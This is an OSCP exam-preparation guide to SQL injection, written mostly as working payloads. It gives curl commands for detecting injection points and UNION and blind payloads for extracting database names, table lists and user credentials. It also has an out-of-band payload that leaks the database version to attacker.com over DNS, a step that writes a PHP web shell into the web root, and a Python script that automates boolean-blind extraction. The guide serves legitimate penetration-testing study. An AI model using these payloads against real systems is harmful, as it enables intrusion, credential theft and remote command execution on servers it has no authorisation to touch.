# Enhanced OSCP SQL Injection Guide with Examples

## 1. Injection Point Discovery

### 1.1 Error Triggering  
Inject a quote to provoke SQL syntax errors.  
Example:  
```bash
curl -i "http://target/item.php?id=1'"
```
Response shows:
```
500 Internal Server Error
SQL syntax error near '' at line 1
```
This confirms an injectable parameter.

### 1.2 Boolean Test  
Compare true vs. false conditions.  
```bash
# True condition
curl -i "http://target/item.php?id=1 AND 1=1--"  
# False condition
curl -i "http://target/item.php?id=1 AND 1=2--"
```
If the first returns the normal page and the second returns a blank or error page, SQLi exists.

### 1.3 UNION Test  
Determine column count by incrementing columns until no error.  
```bash
# 1 column
curl -i "http://target/item.php?id=1 UNION SELECT 1--"  
# 2 columns
curl -i "http://target/item.php?id=1 UNION SELECT 1,2--"  
# 3 columns
curl -i "http://target/item.php?id=1 UNION SELECT 1,2,3--"
```
When a valid page renders (no error), note the column count (e.g., 3).

***

## 2. Differentiating Injection Types with Examples

### 2.1 Error-Based Injection  
**Indicator:** Error messages reveal data.  
Example – retrieve database version:  
```sql
?id=1 AND (SELECT CONCAT(CHAR(60,118,62),@@version,CHAR(60,47,118,62)))--  
```
Rendered page fragment: `<v>5.7.31</v>`

### 2.2 Union-Based Injection  
**Indicator:** Page echoes query results.  
Example – display version and user:  
```sql
?id=1 UNION SELECT @@version, user(), null--  
```
Page shows:
```
5.7.31    webapp@localhost
```

### 2.3 Boolean-Based Blind Injection  
**Indicator:** Page content changes without errors.  
Example – test first character of database name:  
```sql
?id=1 AND SUBSTRING(database(),1,1)='t'--  
```
- If page normal ⇒ true  
```sql
?id=1 AND SUBSTRING(database(),1,1)='x'--  
```
- If page blank ⇒ false  

### 2.4 Time-Based Blind Injection  
**Indicator:** Response delay indicates truth.  
Example – test if user() starts with “r”:  
```sql
?id=1 AND IF(LEFT(user(),1)='r',SLEEP(5),0)--  
```
If response delayed ≈5 s, condition true.

### 2.5 Out-of-Band (OOB) Injection  
**Indicator:** DNS lookup logged externally.  
Example – trigger DNS callback with version:  
```sql
?id=1; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\a'))--  
```
Observe DNS query for `5.7.31.attacker.com` on attacker DNS server.

***

## 3. Full Attack Workflow with Examples

1. **Detection**  
   ```bash
   curl -i "http://target/item.php?id=1'"
   ```
2. **Error-Based Extraction**  
   ```bash
   curl "http://target/item.php?id=1 AND (SELECT CONCAT(CHAR(60),user(),CHAR(62)))--"
   ```
3. **Determine Columns**  
   ```bash
   curl "http://target/item.php?id=1 UNION SELECT 1,2,3--"
   ```
4. **Enumerate Tables**  
   ```bash
   curl "http://target/item.php?id=1 UNION SELECT table_name,1,1 FROM information_schema.tables WHERE table_schema=database()--"
   ```
5. **Extract User Data**  
   ```bash
   curl "http://target/item.php?id=1 UNION SELECT username,password,1 FROM users--"
   ```
6. **Write Web Shell**  
   ```bash
   curl "http://target/item.php?id=1; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--"
   ```

***

## 4. Automation Snippet (Boolean Blind)

```python
import requests

url = "http://target/item.php?id=1 AND ASCII(SUBSTRING((SELECT database()),{},1))={}--"
db_name = ""
for pos in range(1, 10):
    for char in range(48, 123):
        r = requests.get(url.format(pos, char))
        if "Welcome" in r.text:
            db_name += chr(char)
            print(f"Found char {pos}: {chr(char)}")
            break
print("Database:", db_name)
```

This script iterates positions and ASCII values, appending correct characters when the response indicates a true condition.

***

By integrating these concrete examples at each phase—detection, differentiation, exploitation—candidates can clearly identify SQLi types and apply the appropriate manual techniques in the OSCP exam.
